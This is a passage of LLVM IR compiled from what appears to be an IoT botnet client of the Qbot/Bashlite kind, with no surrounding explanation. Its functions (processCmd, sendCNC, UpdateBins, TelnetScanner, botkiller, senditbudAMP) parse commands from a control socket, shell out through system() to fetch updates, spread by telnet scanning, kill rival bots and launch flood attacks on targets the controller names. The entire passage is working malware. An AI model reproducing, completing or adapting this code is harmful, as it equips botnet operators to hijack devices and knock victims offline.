  %32 = getelementptr inbounds [128 x i8], [128 x i8]* %10, i32 0, i32 0
  %33 = load i8*, i8** %6, align 8
  %34 = load i8*, i8** %7, align 8
  %35 = load i8*, i8** %8, align 8
  %36 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* %32, i64 128, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.505, i32 0, i32 0), i8* %33, i8* %34, i8* %35) #2
  %37 = getelementptr inbounds [128 x i8], [128 x i8]* %10, i32 0, i32 0
  %38 = call i32 @system(i8* %37)
  br label %39

; <label>:39:                                     ; preds = %31, %27
  %40 = load i8*, i8** %5, align 8
  %41 = call i32 @strcmp(i8* %40, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.506, i32 0, i32 0)) #10
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %51, label %43

; <label>:43:                                     ; preds = %39
  %44 = getelementptr inbounds [128 x i8], [128 x i8]* %11, i32 0, i32 0
  %45 = load i8*, i8** %6, align 8
  %46 = load i8*, i8** %7, align 8
  %47 = load i8*, i8** %8, align 8
  %48 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* %44, i64 128, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.507, i32 0, i32 0), i8* %45, i8* %46, i8* %47) #2
  %49 = getelementptr inbounds [128 x i8], [128 x i8]* %11, i32 0, i32 0
  %50 = call i32 @system(i8* %49)
  br label %51

; <label>:51:                                     ; preds = %43, %39
  %52 = load i8*, i8** %5, align 8
  %53 = call i32 @strcmp(i8* %52, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.508, i32 0, i32 0)) #10
  %54 = icmp ne i32 %53, 0
  br i1 %54, label %63, label %55

; <label>:55:                                     ; preds = %51
  %56 = getelementptr inbounds [128 x i8], [128 x i8]* %12, i32 0, i32 0
  %57 = load i8*, i8** %6, align 8
  %58 = load i8*, i8** %7, align 8
  %59 = load i8*, i8** %8, align 8
  %60 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* %56, i64 128, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.509, i32 0, i32 0), i8* %57, i8* %58, i8* %59) #2
  %61 = getelementptr inbounds [128 x i8], [128 x i8]* %12, i32 0, i32 0
  %62 = call i32 @system(i8* %61)
  br label %63

; <label>:63:                                     ; preds = %55, %51
  %64 = load i8*, i8** %5, align 8
  %65 = call i32 @strcmp(i8* %64, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.510, i32 0, i32 0)) #10
  %66 = icmp ne i32 %65, 0
  br i1 %66, label %75, label %67

; <label>:67:                                     ; preds = %63
  %68 = getelementptr inbounds [128 x i8], [128 x i8]* %13, i32 0, i32 0
  %69 = load i8*, i8** %6, align 8
  %70 = load i8*, i8** %7, align 8
  %71 = load i8*, i8** %8, align 8
  %72 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* %68, i64 128, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.511, i32 0, i32 0), i8* %69, i8* %70, i8* %71) #2
  %73 = getelementptr inbounds [128 x i8], [128 x i8]* %13, i32 0, i32 0
  %74 = call i32 @system(i8* %73)
  br label %75

; <label>:75:                                     ; preds = %67, %63
  %76 = load i8*, i8** %5, align 8
  %77 = call i32 @strcmp(i8* %76, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.512, i32 0, i32 0)) #10
  %78 = icmp ne i32 %77, 0
  br i1 %78, label %87, label %79

; <label>:79:                                     ; preds = %75
  %80 = getelementptr inbounds [128 x i8], [128 x i8]* %14, i32 0, i32 0
  %81 = load i8*, i8** %6, align 8
  %82 = load i8*, i8** %7, align 8
  %83 = load i8*, i8** %8, align 8
  %84 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* %80, i64 128, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.513, i32 0, i32 0), i8* %81, i8* %82, i8* %83) #2
  %85 = getelementptr inbounds [128 x i8], [128 x i8]* %14, i32 0, i32 0
  %86 = call i32 @system(i8* %85)
  br label %87

; <label>:87:                                     ; preds = %79, %75
  %88 = load i8*, i8** %5, align 8
  %89 = call i32 @strcmp(i8* %88, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.514, i32 0, i32 0)) #10
  %90 = icmp ne i32 %89, 0
  br i1 %90, label %99, label %91

; <label>:91:                                     ; preds = %87
  %92 = getelementptr inbounds [128 x i8], [128 x i8]* %15, i32 0, i32 0
  %93 = load i8*, i8** %6, align 8
  %94 = load i8*, i8** %7, align 8
  %95 = load i8*, i8** %8, align 8
  %96 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* %92, i64 128, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.515, i32 0, i32 0), i8* %93, i8* %94, i8* %95) #2
  %97 = getelementptr inbounds [128 x i8], [128 x i8]* %15, i32 0, i32 0
  %98 = call i32 @system(i8* %97)
  br label %99

; <label>:99:                                     ; preds = %91, %87
  ret void
}

; Function Attrs: nounwind
declare i32 @snprintf(i8*, i64, i8*, ...) #4

; Function Attrs: noinline nounwind uwtable
define void @sendCNC(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %10 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %11 = load i32, i32* %6, align 4
  %12 = add i32 %10, -1064938650
  %13 = add i32 %12, %11
  %14 = sub i32 %13, -1064938650
  %15 = add nsw i32 %10, %11
  store i32 %14, i32* %7, align 4
  %16 = load i8*, i8** %4, align 8
  %17 = call i32 @inet_addr(i8* %16) #2
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %19 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %18, i32 0, i32 0
  store i32 %17, i32* %19, align 4
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %20, align 4
  %21 = load i32, i32* %5, align 4
  %22 = trunc i32 %21 to i16
  %23 = call zeroext i16 @htons(i16 zeroext %22) #13
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %23, i16* %24, align 2
  br label %25

; <label>:25:                                     ; preds = %29, %3
  %26 = load i32, i32* %7, align 4
  %27 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %28 = icmp sgt i32 %26, %27
  br i1 %28, label %29, label %37

; <label>:29:                                     ; preds = %25
  %30 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %30, i32* %8, align 4
  %31 = load i32, i32* %8, align 4
  %32 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %33 = call i32 @connect(i32 %31, %struct.sockaddr* %32, i32 16)
  %34 = call i32 @sleep(i32 1)
  %35 = load i32, i32* %8, align 4
  %36 = call i32 @close(i32 %35)
  br label %25

; <label>:37:                                     ; preds = %25
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @UpdateBins() #0 {
  %1 = alloca i32, align 4
  %2 = call i32 @fork() #2
  store i32 %2, i32* %1, align 4
  %3 = icmp eq i32 %2, 0
  br i1 %3, label %4, label %7

; <label>:4:                                      ; preds = %0
  %5 = call i32 @system(i8* getelementptr inbounds ([439 x i8], [439 x i8]* @.str.516, i32 0, i32 0))
  %6 = call i32 @sleep(i32 20)
  br label %10

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* %1, align 4
  %9 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.517, i32 0, i32 0), i32 %8)
  br label %10

; <label>:10:                                     ; preds = %7, %4
  ret void
}

declare i32 @printf(i8*, ...) #3

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i8*, align 8
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  %34 = alloca i32, align 4
  %35 = alloca i32, align 4
  %36 = alloca i32, align 4
  %37 = alloca i8*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i32, align 4
  %40 = alloca i32, align 4
  %41 = alloca i32, align 4
  %42 = alloca i8*, align 8
  %43 = alloca i32, align 4
  %44 = alloca i32, align 4
  %45 = alloca i8*, align 8
  %46 = alloca i8*, align 8
  %47 = alloca i8*, align 8
  %48 = alloca i32, align 4
  %49 = alloca i32, align 4
  %50 = alloca i8*, align 8
  %51 = alloca i8*, align 8
  %52 = alloca i32, align 4
  %53 = alloca i32, align 4
  %54 = alloca i8*, align 8
  %55 = alloca i32, align 4
  %56 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %57 = load i8**, i8*** %4, align 8
  %58 = getelementptr inbounds i8*, i8** %57, i64 0
  %59 = load i8*, i8** %58, align 8
  %60 = call i32 @strcmp(i8* %59, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.134, i32 0, i32 0)) #10
  %61 = icmp ne i32 %60, 0
  br i1 %61, label %63, label %62

; <label>:62:                                     ; preds = %2
  br label %923

; <label>:63:                                     ; preds = %2
  %64 = load i8**, i8*** %4, align 8
  %65 = getelementptr inbounds i8*, i8** %64, i64 0
  %66 = load i8*, i8** %65, align 8
  %67 = call i32 @strcmp(i8* %66, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.518, i32 0, i32 0)) #10
  %68 = icmp ne i32 %67, 0
  br i1 %68, label %70, label %69

; <label>:69:                                     ; preds = %63
  br label %923

; <label>:70:                                     ; preds = %63
  %71 = load i8**, i8*** %4, align 8
  %72 = getelementptr inbounds i8*, i8** %71, i64 0
  %73 = load i8*, i8** %72, align 8
  %74 = call i32 @strcmp(i8* %73, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.519, i32 0, i32 0)) #10
  %75 = icmp ne i32 %74, 0
  br i1 %75, label %77, label %76

; <label>:76:                                     ; preds = %70
  call void (i32, ...) bitcast (void ()* @UpdateBins to void (i32, ...)*)(i32 1)
  br label %923

; <label>:77:                                     ; preds = %70
  %78 = load i8**, i8*** %4, align 8
  %79 = getelementptr inbounds i8*, i8** %78, i64 0
  %80 = load i8*, i8** %79, align 8
  %81 = call i32 @strcmp(i8* %80, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.520, i32 0, i32 0)) #10
  %82 = icmp ne i32 %81, 0
  br i1 %82, label %127, label %83

; <label>:83:                                     ; preds = %77
  %84 = load i8**, i8*** %4, align 8
  %85 = getelementptr inbounds i8*, i8** %84, i64 1
  %86 = load i8*, i8** %85, align 8
  %87 = call i32 @strcmp(i8* %86, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.521, i32 0, i32 0)) #10
  %88 = icmp ne i32 %87, 0
  br i1 %88, label %98, label %89

; <label>:89:                                     ; preds = %83
  %90 = load i32, i32* @scanPid, align 4
  %91 = icmp eq i32 %90, 0
  br i1 %91, label %92, label %93

; <label>:92:                                     ; preds = %89
  br label %923

; <label>:93:                                     ; preds = %89
  %94 = load i32, i32* @scanPid, align 4
  %95 = call i32 @kill(i32 %94, i32 9) #2
  %96 = load i32, i32* @mainCommSock, align 4
  %97 = call i32 (i32, i8*, ...) @sockprintf(i32 %96, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.522, i32 0, i32 0))
  store i32 0, i32* @scanPid, align 4
  br label %98

; <label>:98:                                     ; preds = %93, %83
  %99 = load i8**, i8*** %4, align 8
  %100 = getelementptr inbounds i8*, i8** %99, i64 1
  %101 = load i8*, i8** %100, align 8
  %102 = call i32 @strcmp(i8* %101, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.523, i32 0, i32 0)) #10
  %103 = icmp ne i32 %102, 0
  br i1 %103, label %126, label %104

; <label>:104:                                    ; preds = %98
  %105 = load i32, i32* @scanPid, align 4
  %106 = icmp ne i32 %105, 0
  br i1 %106, label %107, label %108

; <label>:107:                                    ; preds = %104
  br label %923

; <label>:108:                                    ; preds = %104
  %109 = call i32 @fork() #2
  store i32 %109, i32* %5, align 4
  store i32 1000, i32* %6, align 4
  store i32 10, i32* %7, align 4
  %110 = load i32, i32* %5, align 4
  %111 = icmp ugt i32 %110, 0
  br i1 %111, label %112, label %114

; <label>:112:                                    ; preds = %108
  %113 = load i32, i32* %5, align 4
  store i32 %113, i32* @scanPid, align 4
  br label %923

; <label>:114:                                    ; preds = %108
  %115 = load i32, i32* %5, align 4
  %116 = icmp eq i32 %115, -1
  br i1 %116, label %117, label %118

; <label>:117:                                    ; preds = %114
  br label %923

; <label>:118:                                    ; preds = %114
  br label %119

; <label>:119:                                    ; preds = %118
  %120 = load i32, i32* @mainCommSock, align 4
  %121 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %122 = call i8* @inet_ntoa(i32 %121) #2
  %123 = call i32 (i32, i8*, ...) @sockprintf(i32 %120, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.524, i32 0, i32 0), i8* %122)
  %124 = load i32, i32* %7, align 4
  %125 = load i32, i32* %6, align 4
  call void @TelnetScanner(i32 %124, i32 %125)
  call void @_exit(i32 0) #12
  unreachable

; <label>:126:                                    ; preds = %98
  br label %127

; <label>:127:                                    ; preds = %126, %77
  %128 = load i8**, i8*** %4, align 8
  %129 = getelementptr inbounds i8*, i8** %128, i64 0
  %130 = load i8*, i8** %129, align 8
  %131 = call i32 @strcmp(i8* %130, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.525, i32 0, i32 0)) #10
  %132 = icmp ne i32 %131, 0
  br i1 %132, label %142, label %133

; <label>:133:                                    ; preds = %127
  %134 = call i32 @listFork()
  %135 = icmp ne i32 %134, 0
  br i1 %135, label %141, label %136

; <label>:136:                                    ; preds = %133
  %137 = load i32, i32* @mainCommSock, align 4
  %138 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %139 = call i8* @inet_ntoa(i32 %138) #2
  %140 = call i32 (i32, i8*, ...) @sockprintf(i32 %137, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.526, i32 0, i32 0), i8* %139)
  call void @botkiller()
  call void @_exit(i32 0) #12
  unreachable

; <label>:141:                                    ; preds = %133
  br label %142

; <label>:142:                                    ; preds = %141, %127
  %143 = load i8**, i8*** %4, align 8
  %144 = getelementptr inbounds i8*, i8** %143, i64 0
  %145 = load i8*, i8** %144, align 8
  %146 = call i32 @strcmp(i8* %145, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.527, i32 0, i32 0)) #10
  %147 = icmp ne i32 %146, 0
  br i1 %147, label %149, label %148

; <label>:148:                                    ; preds = %142
  br label %923

; <label>:149:                                    ; preds = %142
  %150 = load i8**, i8*** %4, align 8
  %151 = getelementptr inbounds i8*, i8** %150, i64 0
  %152 = load i8*, i8** %151, align 8
  %153 = call i32 @strcmp(i8* %152, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.528, i32 0, i32 0)) #10
  %154 = icmp ne i32 %153, 0
  br i1 %154, label %380, label %155

; <label>:155:                                    ; preds = %149
  %156 = load i8**, i8*** %4, align 8
  %157 = getelementptr inbounds i8*, i8** %156, i64 1
  %158 = load i8*, i8** %157, align 8
  %159 = call i32 @strcmp(i8* %158, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.504, i32 0, i32 0)) #10
  %160 = icmp ne i32 %159, 0
  br i1 %160, label %187, label %161

; <label>:161:                                    ; preds = %155
  %162 = load i32, i32* %3, align 4
  %163 = icmp ne i32 %162, 5
  br i1 %163, label %164, label %165

; <label>:164:                                    ; preds = %161
  br label %923

; <label>:165:                                    ; preds = %161
  %166 = load i8**, i8*** %4, align 8
  %167 = getelementptr inbounds i8*, i8** %166, i64 2
  %168 = load i8*, i8** %167, align 8
  %169 = ptrtoint i8* %168 to i32
  store i32 %169, i32* %8, align 4
  %170 = load i8**, i8*** %4, align 8
  %171 = getelementptr inbounds i8*, i8** %170, i64 3
  %172 = load i8*, i8** %171, align 8
  %173 = ptrtoint i8* %172 to i32
  store i32 %173, i32* %9, align 4
  %174 = load i8**, i8*** %4, align 8
  %175 = getelementptr inbounds i8*, i8** %174, i64 4
  %176 = load i8*, i8** %175, align 8
  %177 = ptrtoint i8* %176 to i32
  store i32 %177, i32* %10, align 4
  %178 = load i32, i32* %8, align 4
  %179 = sext i32 %178 to i64
  %180 = inttoptr i64 %179 to i8*
  %181 = load i32, i32* %9, align 4
  %182 = sext i32 %181 to i64
  %183 = inttoptr i64 %182 to i8*
  %184 = load i32, i32* %10, align 4
  %185 = sext i32 %184 to i64
  %186 = inttoptr i64 %185 to i8*
  call void @senditbudAMP(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.504, i32 0, i32 0), i8* %180, i8* %183, i8* %186)
  br label %187

; <label>:187:                                    ; preds = %165, %155
  %188 = load i8**, i8*** %4, align 8
  %189 = getelementptr inbounds i8*, i8** %188, i64 1
  %190 = load i8*, i8** %189, align 8
  %191 = call i32 @strcmp(i8* %190, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.506, i32 0, i32 0)) #10
  %192 = icmp ne i32 %191, 0
  br i1 %192, label %219, label %193

; <label>:193:                                    ; preds = %187
  %194 = load i32, i32* %3, align 4
  %195 = icmp ne i32 %194, 5
  br i1 %195, label %196, label %197

; <label>:196:                                    ; preds = %193
  br label %923

; <label>:197:                                    ; preds = %193
  %198 = load i8**, i8*** %4, align 8
  %199 = getelementptr inbounds i8*, i8** %198, i64 2
  %200 = load i8*, i8** %199, align 8
  %201 = ptrtoint i8* %200 to i32
  store i32 %201, i32* %11, align 4
  %202 = load i8**, i8*** %4, align 8
  %203 = getelementptr inbounds i8*, i8** %202, i64 3
  %204 = load i8*, i8** %203, align 8
  %205 = ptrtoint i8* %204 to i32
  store i32 %205, i32* %12, align 4
  %206 = load i8**, i8*** %4, align 8
  %207 = getelementptr inbounds i8*, i8** %206, i64 4
  %208 = load i8*, i8** %207, align 8
  %209 = ptrtoint i8* %208 to i32
  store i32 %209, i32* %13, align 4
  %210 = load i32, i32* %11, align 4
  %211 = sext i32 %210 to i64
  %212 = inttoptr i64 %211 to i8*
  %213 = load i32, i32* %12, align 4
  %214 = sext i32 %213 to i64
  %215 = inttoptr i64 %214 to i8*
  %216 = load i32, i32* %13, align 4
  %217 = sext i32 %216 to i64
  %218 = inttoptr i64 %217 to i8*
  call void @senditbudAMP(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.506, i32 0, i32 0), i8* %212, i8* %215, i8* %218)
  br label %219

; <label>:219:                                    ; preds = %197, %187
  %220 = load i8**, i8*** %4, align 8
  %221 = getelementptr inbounds i8*, i8** %220, i64 1
  %222 = load i8*, i8** %221, align 8
  %223 = call i32 @strcmp(i8* %222, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.508, i32 0, i32 0)) #10
  %224 = icmp ne i32 %223, 0
  br i1 %224, label %251, label %225

; <label>:225:                                    ; preds = %219
  %226 = load i32, i32* %3, align 4
  %227 = icmp ne i32 %226, 5
  br i1 %227, label %228, label %229

; <label>:228:                                    ; preds = %225
  br label %923

; <label>:229:                                    ; preds = %225
  %230 = load i8**, i8*** %4, align 8
  %231 = getelementptr inbounds i8*, i8** %230, i64 2
  %232 = load i8*, i8** %231, align 8
  %233 = ptrtoint i8* %232 to i32
  store i32 %233, i32* %14, align 4
  %234 = load i8**, i8*** %4, align 8
  %235 = getelementptr inbounds i8*, i8** %234, i64 3
  %236 = load i8*, i8** %235, align 8
  %237 = ptrtoint i8* %236 to i32
  store i32 %237, i32* %15, align 4
  %238 = load i8**, i8*** %4, align 8
  %239 = getelementptr inbounds i8*, i8** %238, i64 4
  %240 = load i8*, i8** %239, align 8
  %241 = ptrtoint i8* %240 to i32
  store i32 %241, i32* %16, align 4
  %242 = load i32, i32* %14, align 4
  %243 = sext i32 %242 to i64
  %244 = inttoptr i64 %243 to i8*
  %245 = load i32, i32* %15, align 4
  %246 = sext i32 %245 to i64
  %247 = inttoptr i64 %246 to i8*
  %248 = load i32, i32* %16, align 4
  %249 = sext i32 %248 to i64
  %250 = inttoptr i64 %249 to i8*
  call void @senditbudAMP(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.508, i32 0, i32 0), i8* %244, i8* %247, i8* %250)
  br label %251

; <label>:251:                                    ; preds = %229, %219
  %252 = load i8**, i8*** %4, align 8
  %253 = getelementptr inbounds i8*, i8** %252, i64 1
  %254 = load i8*, i8** %253, align 8
  %255 = call i32 @strcmp(i8* %254, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.510, i32 0, i32 0)) #10
  %256 = icmp ne i32 %255, 0
  br i1 %256, label %283, label %257

; <label>:257:                                    ; preds = %251
  %258 = load i32, i32* %3, align 4
  %259 = icmp ne i32 %258, 5
  br i1 %259, label %260, label %261

; <label>:260:                                    ; preds = %257
  br label %923

; <label>:261:                                    ; preds = %257
  %262 = load i8**, i8*** %4, align 8
  %263 = getelementptr inbounds i8*, i8** %262, i64 2
  %264 = load i8*, i8** %263, align 8
  %265 = ptrtoint i8* %264 to i32
  store i32 %265, i32* %17, align 4
  %266 = load i8**, i8*** %4, align 8
  %267 = getelementptr inbounds i8*, i8** %266, i64 3
  %268 = load i8*, i8** %267, align 8
  %269 = ptrtoint i8* %268 to i32
  store i32 %269, i32* %18, align 4
  %270 = load i8**, i8*** %4, align 8
  %271 = getelementptr inbounds i8*, i8** %270, i64 4
  %272 = load i8*, i8** %271, align 8
  %273 = ptrtoint i8* %272 to i32
  store i32 %273, i32* %19, align 4
  %274 = load i32, i32* %17, align 4
  %275 = sext i32 %274 to i64
  %276 = inttoptr i64 %275 to i8*
  %277 = load i32, i32* %18, align 4
  %278 = sext i32 %277 to i64
  %279 = inttoptr i64 %278 to i8*
  %280 = load i32, i32* %19, align 4
  %281 = sext i32 %280 to i64
  %282 = inttoptr i64 %281 to i8*
  call void @senditbudAMP(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.510, i32 0, i32 0), i8* %276, i8* %279, i8* %282)
  br label %283

; <label>:283:                                    ; preds = %261, %251
  %284 = load i8**, i8*** %4, align 8
  %285 = getelementptr inbounds i8*, i8** %284, i64 1
  %286 = load i8*, i8** %285, align 8
  %287 = call i32 @strcmp(i8* %286, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.502, i32 0, i32 0)) #10
  %288 = icmp ne i32 %287, 0
  br i1 %288, label %315, label %289

; <label>:289:                                    ; preds = %283
  %290 = load i32, i32* %3, align 4
  %291 = icmp ne i32 %290, 5
  br i1 %291, label %292, label %293

; <label>:292:                                    ; preds = %289
  br label %923

; <label>:293:                                    ; preds = %289
  %294 = load i8**, i8*** %4, align 8
  %295 = getelementptr inbounds i8*, i8** %294, i64 2
  %296 = load i8*, i8** %295, align 8
  %297 = ptrtoint i8* %296 to i32
  store i32 %297, i32* %20, align 4
  %298 = load i8**, i8*** %4, align 8
  %299 = getelementptr inbounds i8*, i8** %298, i64 3
  %300 = load i8*, i8** %299, align 8
  %301 = ptrtoint i8* %300 to i32
  store i32 %301, i32* %21, align 4
  %302 = load i8**, i8*** %4, align 8
  %303 = getelementptr inbounds i8*, i8** %302, i64 4
  %304 = load i8*, i8** %303, align 8
  %305 = ptrtoint i8* %304 to i32
  store i32 %305, i32* %22, align 4
  %306 = load i32, i32* %20, align 4
  %307 = sext i32 %306 to i64
  %308 = inttoptr i64 %307 to i8*
  %309 = load i32, i32* %21, align 4
  %310 = sext i32 %309 to i64
  %311 = inttoptr i64 %310 to i8*
  %312 = load i32, i32* %22, align 4
  %313 = sext i32 %312 to i64
  %314 = inttoptr i64 %313 to i8*
  call void @senditbudAMP(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.502, i32 0, i32 0), i8* %308, i8* %311, i8* %314)
  br label %315

; <label>:315:                                    ; preds = %293, %283
  %316 = load i8**, i8*** %4, align 8
  %317 = getelementptr inbounds i8*, i8** %316, i64 1
  %318 = load i8*, i8** %317, align 8
  %319 = call i32 @strcmp(i8* %318, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.512, i32 0, i32 0)) #10
  %320 = icmp ne i32 %319, 0
  br i1 %320, label %347, label %321

; <label>:321:                                    ; preds = %315
  %322 = load i32, i32* %3, align 4
  %323 = icmp ne i32 %322, 5
  br i1 %323, label %324, label %325

; <label>:324:                                    ; preds = %321
  br label %923

; <label>:325:                                    ; preds = %321
  %326 = load i8**, i8*** %4, align 8
  %327 = getelementptr inbounds i8*, i8** %326, i64 2
  %328 = load i8*, i8** %327, align 8
  %329 = ptrtoint i8* %328 to i32
  store i32 %329, i32* %23, align 4
  %330 = load i8**, i8*** %4, align 8
  %331 = getelementptr inbounds i8*, i8** %330, i64 3
  %332 = load i8*, i8** %331, align 8
  %333 = ptrtoint i8* %332 to i32
  store i32 %333, i32* %24, align 4
  %334 = load i8**, i8*** %4, align 8
  %335 = getelementptr inbounds i8*, i8** %334, i64 4
  %336 = load i8*, i8** %335, align 8
  %337 = ptrtoint i8* %336 to i32
  store i32 %337, i32* %25, align 4
  %338 = load i32, i32* %23, align 4
  %339 = sext i32 %338 to i64
  %340 = inttoptr i64 %339 to i8*
  %341 = load i32, i32* %24, align 4
  %342 = sext i32 %341 to i64
  %343 = inttoptr i64 %342 to i8*
  %344 = load i32, i32* %25, align 4
  %345 = sext i32 %344 to i64
  %346 = inttoptr i64 %345 to i8*
  call void @senditbudAMP(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.512, i32 0, i32 0), i8* %340, i8* %343, i8* %346)
  br label %347

; <label>:347:                                    ; preds = %325, %315
  %348 = load i8**, i8*** %4, align 8
  %349 = getelementptr inbounds i8*, i8** %348, i64 1
  %350 = load i8*, i8** %349, align 8
  %351 = call i32 @strcmp(i8* %350, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.514, i32 0, i32 0)) #10
  %352 = icmp ne i32 %351, 0
  br i1 %352, label %379, label %353

; <label>:353:                                    ; preds = %347
  %354 = load i32, i32* %3, align 4
  %355 = icmp ne i32 %354, 5
  br i1 %355, label %356, label %357

; <label>:356:                                    ; preds = %353
  br label %923

; <label>:357:                                    ; preds = %353
  %358 = load i8**, i8*** %4, align 8
  %359 = getelementptr inbounds i8*, i8** %358, i64 2
  %360 = load i8*, i8** %359, align 8
  %361 = ptrtoint i8* %360 to i32
  store i32 %361, i32* %26, align 4
  %362 = load i8**, i8*** %4, align 8
  %363 = getelementptr inbounds i8*, i8** %362, i64 3
  %364 = load i8*, i8** %363, align 8
  %365 = ptrtoint i8* %364 to i32
  store i32 %365, i32* %27, align 4
  %366 = load i8**, i8*** %4, align 8
  %367 = getelementptr inbounds i8*, i8** %366, i64 4
  %368 = load i8*, i8** %367, align 8
  %369 = ptrtoint i8* %368 to i32
  store i32 %369, i32* %28, align 4
  %370 = load i32, i32* %26, align 4
  %371 = sext i32 %370 to i64
  %372 = inttoptr i64 %371 to i8*
  %373 = load i32, i32* %27, align 4
  %374 = sext i32 %373 to i64
  %375 = inttoptr i64 %374 to i8*
  %376 = load i32, i32* %28, align 4
  %377 = sext i32 %376 to i64
  %378 = inttoptr i64 %377 to i8*
  call void @senditbudAMP(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.514, i32 0, i32 0), i8* %372, i8* %375, i8* %378)
  br label %379

; <label>:379:                                    ; preds = %357, %347
  br label %380

; <label>:380:                                    ; preds = %379, %149
  %381 = load i8**, i8*** %4, align 8
  %382 = getelementptr inbounds i8*, i8** %381, i64 0
  %383 = load i8*, i8** %382, align 8
  %384 = call i32 @strcmp(i8* %383, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.529, i32 0, i32 0)) #10
  %385 = icmp ne i32 %384, 0
  br i1 %385, label %529, label %386

; <label>:386:                                    ; preds = %380
  %387 = load i32, i32* %3, align 4
  %388 = icmp slt i32 %387, 6
  br i1 %388, label %440, label %389

; <label>:389:                                    ; preds = %386
  %390 = load i8**, i8*** %4, align 8
  %391 = getelementptr inbounds i8*, i8** %390, i64 3
  %392 = load i8*, i8** %391, align 8
  %393 = call i32 @atoi(i8* %392) #10
  %394 = icmp eq i32 %393, -1
  br i1 %394, label %440, label %395

; <label>:395:                                    ; preds = %389
  %396 = load i8**, i8*** %4, align 8
  %397 = getelementptr inbounds i8*, i8** %396, i64 2
  %398 = load i8*, i8** %397, align 8
  %399 = call i32 @atoi(i8* %398) #10
  %400 = icmp eq i32 %399, -1
  br i1 %400, label %440, label %401

; <label>:401:                                    ; preds = %395
  %402 = load i8**, i8*** %4, align 8
